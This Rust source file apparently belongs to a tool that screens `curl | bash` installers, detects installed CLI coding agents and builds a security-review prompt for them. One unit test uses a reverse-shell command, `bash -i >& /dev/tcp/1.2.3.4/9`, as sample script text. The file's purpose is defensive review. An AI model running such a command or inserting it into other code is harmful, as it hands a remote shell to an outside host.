use std::path::Path;

pub struct Agent {
    pub name: &'static str,
    pub bin: &'static str,
    /// How to launch the agent with an initial prompt.
    pub args: fn(&str) -> Vec<String>,
}

/// Known CLI agents, in the order they are offered
pub const AGENTS: &[Agent] = &[
    Agent {
        name: "Codex",
        bin: "codex",
        args: |p| vec!["exec".into(), p.to_string()],
    },
    Agent {
        name: "Claude Code",
        bin: "claude",
        args: |p| vec!["-p".into(), p.to_string()],
    },
    Agent {
        name: "OpenCode",
        bin: "opencode",
        args: |p| vec!["run".into(), p.to_string()],
    },
    Agent {
        name: "pi",
        bin: "pi",
        args: |p| vec!["-p".into(), p.to_string()],
    },
    Agent {
        name: "Gemini CLI",
        bin: "gemini",
        args: |p| vec!["-p".into(), p.to_string()],
    },
];

/// Agents whose binary is on `PATH`.
pub fn available() -> Vec<&'static Agent> {
    AGENTS.iter().filter(|a| in_path(a.bin)).collect()
}

/// Whether an executable named `bin` exists on `PATH`.
pub fn in_path(bin: &str) -> bool {
    let path = crate::runner::real_path();
    path.split(':').filter(|d| !d.is_empty()).any(|d| {
        let p = Path::new(d).join(bin);
        p.is_file() && is_executable(&p)
    })
}

#[cfg(unix)]
fn is_executable(p: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(p)
        .map(|m| m.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

/// A review prompt containing the findings and the full script.
pub fn review_prompt(findings: &str, source: &str) -> String {
    format!(
        "You are a security reviewer. A `curl | bash` installer is about to run and the static \
checker bashka flagged it with the findings below. Decide whether it is safe to run and \
explain any data exfiltration, backdoor, credential theft, or destructive behaviour you find. \
Be concrete about which lines are responsible.\n\n\
bashka findings:\n{findings}\n\n\
Full script under review:\n```bash\n{source}\n```\n"
    )
}

/// Copies `text` to the system clipboard; returns the tool used, if any.
pub fn copy_to_clipboard(text: &str) -> Option<&'static str> {
    use std::io::Write;
    use std::process::{Command, Stdio};
    const TOOLS: &[(&str, &[&str])] = &[
        ("pbcopy", &[]),
        ("wl-copy", &[]),
        ("xclip", &["-selection", "clipboard"]),
        ("xsel", &["--clipboard", "--input"]),
    ];
    for (bin, args) in TOOLS {
        if !in_path(bin) {
            continue;
        }
        if let Ok(mut child) = Command::new(bin).args(*args).stdin(Stdio::piped()).spawn() {
            if let Some(mut stdin) = child.stdin.take() {
                let _ = stdin.write_all(text.as_bytes());
            }
            if child.wait().map(|s| s.success()).unwrap_or(false) {
                return Some(bin);
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn codex_is_first_claude_second() {
        assert_eq!(AGENTS[0].name, "Codex");
        assert_eq!(AGENTS[1].name, "Claude Code");
    }

    #[test]
    fn agents_use_non_interactive_modes() {
        let by = |n: &str| AGENTS.iter().find(|a| a.name == n).unwrap();
        assert_eq!((by("Codex").args)("P"), ["exec", "P"]);
        assert_eq!((by("Claude Code").args)("P"), ["-p", "P"]);
        assert_eq!((by("OpenCode").args)("P"), ["run", "P"]);
        assert_eq!((by("pi").args)("P"), ["-p", "P"]);
    }

    #[test]
    fn review_prompt_carries_findings_and_source() {
        let p = review_prompt(
            "- [reverse_shell] backdoor",
            "bash -i >& /dev/tcp/1.2.3.4/9",
        );
        assert!(p.contains("[reverse_shell] backdoor"));
        assert!(p.contains("/dev/tcp/1.2.3.4/9"));
        assert!(p.contains("```bash"));
    }

    #[test]
    fn in_path_finds_an_executable() {
        let dir = tempfile::tempdir().unwrap();
        let exe = dir.path().join("faketool");
        std::fs::write(&exe, "#!/bin/sh\ntrue\n").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        let prev = std::env::var("PATH").unwrap_or_default();
        // real_path() reads BASHFLAGS_REAL_PATH first, then PATH.
        // Safe here: tests are single-threaded per binary section and we restore it.
        unsafe {
            std::env::set_var(
                "BASHFLAGS_REAL_PATH",
                format!("{}:{}", dir.path().display(), prev),
            )
        };
        assert!(in_path("faketool"));
        assert!(!in_path("definitely-not-a-real-binary-xyz"));
        unsafe { std::env::remove_var("BASHFLAGS_REAL_PATH") };
    }
}
